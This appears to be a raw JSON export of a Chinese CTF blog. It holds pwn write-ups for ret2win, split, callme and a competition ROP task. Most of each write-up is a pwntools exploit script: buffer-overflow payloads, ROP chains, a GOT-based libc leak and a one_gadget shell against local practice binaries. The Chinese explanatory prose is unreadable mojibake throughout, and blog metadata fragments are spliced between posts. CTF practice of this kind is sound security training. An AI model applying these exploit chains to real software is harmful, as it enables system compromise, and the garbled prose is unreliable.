ret2winæ€è·¯å’Œä¸Šé¢çš„æ–¹æ³•ä¸€æ ·ï¼Œåªæœ‰ä¸€ç‚¹å·®åˆ«æ˜¯åœ¨64ä½ä¸‹å‰6ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œæ›´å¤šçš„å‚æ•°æ‰å…¥æ ˆã€‚ expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;ret2win&#39;) elf = ELF(&#39;ret2win&#39;) bufsize = 0x20 buf = &#39;a&#39;*bufsize fake_ebp = &#39;a&#39;*0x8 sh_addr = 0x400811 payload = buf + fake_ebp + p64(sh_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() split32æ€è·¯çƒ­èº«é¢˜ï¼Œå¾ˆç›´æ¥çš„ret2syscall expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./split32&#39;) elf = ELF(&#39;./split32&#39;) system_addr = elf.plt[&#39;system&#39;] pop_ret = 0x080483e1 sh_addr = 0x804a030 bufsize = 40 buf = &#39;a&#39;*bufsize payload = buf + &#39;aaaa&#39; + p32(system_addr) + &#39;aaaa&#39; + p32(sh_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() splitæ€è·¯64ä½çš„ret2syscall,æ¯”å¦‚æˆ‘ä»¬æƒ³è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œé‚£è¿™ä¸ªå‚æ•°éœ€è¦è¢«å¸ƒç½®åˆ°å¯„å­˜å™¨rdiä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥å¯»æ‰¾è¯¸å¦‚pop rdi;retçš„ä»£ç ç‰‡æ®µï¼Œä»è€Œåœ¨æ‰§è¡Œå®Œpop rdiåæŠŠæ ˆä¸Šå¸ƒç½®å¥½çš„æ•°æ®å­˜æ”¾åˆ°å¯„å­˜å™¨rdiä¸­åèƒ½å¤Ÿå†æ¬¡æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼ˆretï¼‰ expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./split&#39;) elf = ELF(&#39;./split&#39;) bufsize = 32 buf = &#39;a&#39;*bufsize system_addr = elf.plt[&#39;system&#39;] pop_rdi_ret = 0x400883 sh_addr = 0x601060 payload = buf + &#39;a&#39;*8 + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() callme32æ€è·¯ret2libcçš„ç®€å•åˆ©ç”¨ï¼Œå®¡è®¡è¿‡ç¨‹åºå’Œlibccallme32.soä¸éš¾ç†è§£è¦å¾—åˆ°flagè¦ä¾æ¬¡è°ƒç”¨callme_one(1,2,3),callme_two(1,2,3),callme_three(1,2,3),è¿™ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯å®šä¹‰åœ¨libccallme32é‡Œ,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åƒè°ƒç”¨systemå»è°ƒç”¨(æ³¨æ„å †æ ˆå¹³è¡¡) expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./callme32&#39;) elf = ELF(&#39;./callme32&#39;) callme_one = elf.plt[&#39;callme_one&#39;] callme_two = elf.plt[&#39;callme_two&#39;] callme_three = elf.plt[&#39;callme_three&#39;] ppp_ret = 0x080488a9 bufsize = 0x28 buf = &#39;a&#39;*bufsize argv = p32(1)+p32(2)+p32(3) payload = buf + &#39;aaaa&#39; payload += p32(callme_one)+p32(ppp_ret)+argv payload += p32(callme_two)+p32(ppp_ret)+argv payload += p32(callme_three)+p32(ppp_ret)+argv def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() callmeæ€è·¯å’Œ32ä½å·®ä¸å¤šï¼Œä¸è¿‡ä¸ç”¨è€ƒè™‘å †æ ˆå¹³è¡¡(æ³¨æ„64ä½å’Œ32ä½çš„å·®åˆ«) expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./callme&#39;) elf = ELF(&#39;./callme&#39;) callme_one = elf.plt[&#39;callme_one&#39;] callme_two = elf.plt[&#39;callme_two&#39;] callme_three = elf.plt[&#39;callme_three&#39;] ppp_ret = 0x401ab0 bufsize = 0x20 buf = &#39;a&#39;*bufsize argv = p64(1) + p64(2) + p64(3) payload = buf + &#39;a&#39;*8 payload += p64(ppp_ret) + argv + p64(callme_one) payload += p64(ppp_ret) + argv + p64(callme_two) payload += p64(ppp_ret) + argv + p64(callme_three) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() write432æ€è·¯exp","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"é“ä¸‰ç¦å»ºèµ›åŒºpwnå›é¡¾","slug":"é“ä¸‰ç¦å»ºèµ›åŒºpwnå›é¡¾","date":"2019-11-05T03:44:15.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/é“ä¸‰ç¦å»ºèµ›åŒºpwnå›é¡¾/","link":"","permalink":"/2019/11/05/é“ä¸‰ç¦å»ºèµ›åŒºpwnå›é¡¾/","excerpt":"","text":"å»ºäº†æ–°åšå®¢å¼€å§‹è¿˜æ˜¯å†™ç‚¹ä¸œè¥¿å­˜ç€ï¼Œä¸ç„¶ç©ºç©ºçš„æ„Ÿè§‰ä¹Ÿä¸æ˜¯å¾ˆå¥½ï¼Œåˆšå¥½çœ‹åˆ°æ–‡æ¶›å­¦é•¿ç»™æˆ‘çš„é“ä¸‰PWNé¢˜ï¼Œå½“æ—¶æˆ‘è¿æ¶›ç¥å†™çš„expéƒ½çœ‹ä¸æ‡‚ï¼Œç°åœ¨çœ‹çœ‹è‡ªå·±å½“åˆçœŸçš„å¤ªèœäº†ï¼Œæ‰€ä»¥ç°åœ¨é‡æ–°çœ‹ä¸€éé¢˜ç›®æ¥æ£€éªŒç°åœ¨çš„å®åŠ› ROPæ€è·¯ç®€å•çœ‹äº†ä¸€éç¨‹åºï¼Œvulnå‡½æ•°æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œåˆ©ç”¨ç©ºé—´è´¼å¤§ï¼Œchecksecæ£€æµ‹ä¸‹åªå¼€äº†NXï¼Œç›´æ¥ret2libcåšROPæ¥getshell expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./rop&#39;) elf = ELF(&#39;./rop&#39;) libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;) #libc = ELF(&#39;./libc32&#39;) buf = &#39;a&#39;*0x88 vuln_addr = 0x08048474 write_got = elf.got[&#39;write&#39;] write_plt = elf.plt[&#39;write&#39;] write_sym = libc.symbols[&#39;write&#39;] bin_sh = libc.search(&#39;/bin/sh&#39;).next() system_sym = libc.symbols[&#39;system&#39;] leak = buf+&#39;aaaa&#39;+ p32(write_plt) +p32(vuln_addr)+ p32(1) + p32(write_got) + p32(0x4) n.sendline(leak) write_addr = u32(n.recv()) print hex(write_addr) libc_base = write_addr - write_sym system_addr = libc_base + system_sym #one_gadget = 0x3a80c one_gadget = 0x3ac5c + libc_base payload = buf+ &#39;aaaa&#39; + p32(one_gadget) n.sendline(payload) n.interactive() breakfastæ€è·¯ç®€å•çš„å®¡ä¸€éä»£ç å‘ç° writeæ­£å¸¸åº”è¯¥æ˜¯è¾“å‡ºptr[idx]ï¼Œè¿™é‡Œå¾ˆçªå…€çš„å°±è¾“å‡ºäº†ptr[idx]æ‰€æŒ‡å‘åœ°å€çš„å†…å®¹ï¼Œæ‰€ä»¥å¾€ptr[idx]é‡Œå†™å…¥writeçš„gotåœ°å€æ¥è·å¾—å®é™…åœ°å€æ¥è®¡ç®—libc_base","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]}]}